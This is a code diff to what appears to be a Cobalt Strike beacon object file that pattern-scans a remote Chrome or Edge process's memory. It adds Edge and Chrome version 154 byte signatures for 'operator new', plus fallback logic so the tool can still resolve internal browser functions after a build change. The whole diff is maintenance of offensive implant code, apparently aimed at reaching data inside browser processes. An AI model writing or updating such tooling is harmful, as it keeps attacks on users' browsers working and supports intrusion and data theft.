@@ -233,6 +233,46 @@ static const uint8_t OPERATOR_NEW_MASK[] = {
     1,1,1,1,1,1,1,1,1,1
 };
 
+/* Edge 154 switched to a direct malloc call at the start of operator new. */
+static const uint8_t EDGE_154_OPERATOR_NEW_SIG[] = {
+    0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xD9, 0xE8,
+    0x00, 0x00, 0x00, 0x00,
+    0x48, 0x85, 0xC0, 0x75, 0x00,
+    0x48, 0x8B, 0xCB, 0xE8,
+    0x00, 0x00, 0x00, 0x00,
+    0x85, 0xC0, 0x74, 0x00,
+    0x48, 0x8B, 0xCB
+};
+static const uint8_t EDGE_154_OPERATOR_NEW_MASK[] = {
+    1,1,1,1,1,1,1,1,1,1,
+    0,0,0,0,
+    1,1,1,1,0,
+    1,1,1,1,
+    0,0,0,0,
+    1,1,1,0,
+    1,1,1
+};
+
+/* Kept separate from Edge so later Chromium build changes can diverge. */
+static const uint8_t CHROME_154_OPERATOR_NEW_SIG[] = {
+    0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xD9, 0xE8,
+    0x00, 0x00, 0x00, 0x00,
+    0x48, 0x85, 0xC0, 0x75, 0x00,
+    0x48, 0x8B, 0xCB, 0xE8,
+    0x00, 0x00, 0x00, 0x00,
+    0x85, 0xC0, 0x74, 0x00,
+    0x48, 0x8B, 0xCB
+};
+static const uint8_t CHROME_154_OPERATOR_NEW_MASK[] = {
+    1,1,1,1,1,1,1,1,1,1,
+    0,0,0,0,
+    1,1,1,1,0,
+    1,1,1,1,
+    0,0,0,0,
+    1,1,1,0,
+    1,1,1
+};
+
 static const uint8_t VTABLE_ENTRY0_SIG[] = {
     0x56, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0xCE,
     0xF6, 0xC2, 0x01, 0x74, 0x08, 0x48, 0x89, 0xF1,
@@ -593,9 +633,29 @@ static BOOL ResolveSymbolsRuntime(HANDLE hProcess, uintptr_t module_base, const 
         return FALSE;
     }
 
-    new_hits = CountRemoteSignatureHits(
-        hProcess, text_base, text_size, OPERATOR_NEW_SIG, OPERATOR_NEW_MASK,
-        sizeof(OPERATOR_NEW_SIG), chrome_new);
+    if (target->browser_name[0] == 'e') {
+        new_hits = CountRemoteSignatureHits(
+            hProcess, text_base, text_size,
+            EDGE_154_OPERATOR_NEW_SIG, EDGE_154_OPERATOR_NEW_MASK,
+            sizeof(EDGE_154_OPERATOR_NEW_SIG), chrome_new);
+        if (new_hits == 0) {
+            new_hits = CountRemoteSignatureHits(
+                hProcess, text_base, text_size,
+                OPERATOR_NEW_SIG, OPERATOR_NEW_MASK,
+                sizeof(OPERATOR_NEW_SIG), chrome_new);
+        }
+    } else {
+        new_hits = CountRemoteSignatureHits(
+            hProcess, text_base, text_size,
+            CHROME_154_OPERATOR_NEW_SIG, CHROME_154_OPERATOR_NEW_MASK,
+            sizeof(CHROME_154_OPERATOR_NEW_SIG), chrome_new);
+        if (new_hits == 0) {
+            new_hits = CountRemoteSignatureHits(
+                hProcess, text_base, text_size,
+                OPERATOR_NEW_SIG, OPERATOR_NEW_MASK,
+                sizeof(OPERATOR_NEW_SIG), chrome_new);
+        }
+    }
     if (new_hits != 1) {
         BeaconPrintf(CALLBACK_ERROR, "[-] operator new signature must be unique (hits=%d)", new_hits);
         return FALSE;
